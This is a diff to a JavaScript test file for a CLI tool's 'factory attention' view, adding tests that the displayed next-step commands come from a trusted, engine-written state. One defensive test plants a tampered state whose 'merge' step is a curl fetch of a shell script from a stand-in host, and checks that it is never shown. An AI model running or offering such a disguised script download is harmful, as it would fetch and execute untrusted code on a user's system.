@@ -24,6 +24,7 @@ import { lanesFor, LOCAL_ISSUE, localOpts, localWorld } from '../../run/__tests_
 import { collectAttention } from '../collect.js';
 import { cellWidth, layoutColumns, textWidth } from '../render.js';
 import { stripAnsi } from '../../../utils/string-width.js';
+import { gateNext, humanCommand, stateFacts } from '../../run/gate-next.js';
 const REPO = 'https://github.com/o/r';
 const HEAD = 'b'.repeat(40);
 const NOW = Date.parse('2026-11-20T12:00:00.000Z');
@@ -285,7 +286,9 @@ describe('omg factory attention', () => {
             const d = collectAttention(w.root, { ledgerDir: w.ledgerDir, now: () => Date.now(), owner: OWNER, limits: null });
             const row = d.items.find((i) => i.key === `#${LOCAL_ISSUE}`);
             expect(row).toMatchObject({ group: 'merge', trust: 'ok', gate: 'merge' });
-            expect(row.next[0].argv.join(' ')).toBe(outcome.mergeCommand);
+            expect(humanCommand(row.next[0].argv)).toBe(outcome.mergeCommand);
+            // The row's commands are the run's sealed next steps.
+            expect(row.next.map((n) => n.argv)).toEqual(outcome.gate.next.map((n) => n.argv));
             expect(row.next[1].argv).toEqual(['omg', 'factory', 'run', String(LOCAL_ISSUE)]);
             expect(d.forge).toBe('local');
         }
@@ -591,6 +594,41 @@ describe('omg factory attention: engine lock and slot reads (L-4)', () => {
         // A directory in place of the engine lock is unreadable (held for the engine count only when readable), and it is never followed.
         mkdirSync(join(factoryStateDir(root), 'engine.owner'));
         expect(() => collectAttention(root, { ledgerDir, now: () => NOW, owner })).not.toThrow();
+    });
+});
+describe('omg factory attention: the sealed next commands (FactoryGate.next)', () => {
+    const collect = () => collectAttention(root, { ledgerDir, now: () => NOW, owner: OWNER });
+    const row = (issue) => collect().items.find((i) => i.key === `#${issue}`);
+    const cases = [
+        ['merge', { pr: 5, head: HEAD }],
+        ['gates-unsandboxed', { pr: 5, head: HEAD }],
+        ['ci-fix-failed', {}],
+        ['decisions-rewritten', {}],
+        ['some-future-gate', {}],
+    ];
+    it.each(cases)('%s: the same row from the sealed value and from the table fallback', (gate, extra) => {
+        const old = parked(40, gate, 2, extra);
+        asEngine(old);
+        const fallback = row(40);
+        expect(fallback.trust).toBe('ok');
+        expect(fallback.next.length).toBeGreaterThan(0);
+        const sealed = { ...old, gate: { ...old.gate, next: gateNext(gate, stateFacts(old, root)) } };
+        asEngine(sealed);
+        expect(row(40)).toEqual(fallback);
+    });
+    it('prefers the sealed value of a trusted state over the table', () => {
+        const s = parked(41, 'merge', 2, { pr: 5, head: HEAD });
+        asEngine({ ...s, gate: { ...s.gate, next: [{ label: 'read the run state', argv: ['omg', 'factory', 'run', 'status', '41'] }] } });
+        expect(row(41).next).toEqual([{ label: 'read the run state', argv: ['omg', 'factory', 'run', 'status', '41'], billed: false }]);
+    });
+    it('never prints a sealed value from a state that is not the engine\'s last write', () => {
+        const s = parked(42, 'merge', 2, { pr: 5, head: HEAD });
+        asEngine(s);
+        const evil = { ...s, gate: { ...s.gate, next: [{ label: 'merge', argv: ['curl', 'https://example.invalid/x.sh'] }] } };
+        writeFileSync(factoryStatePath(root, 42), JSON.stringify({ ...evil, integrity: computeFactoryIntegrity(evil) }));
+        const r = row(42);
+        expect(r.trust).toBe('ledger');
+        expect(JSON.stringify(r.next)).not.toContain('example.invalid');
     });
 });
 //# sourceMappingURL=attention.test.js.map
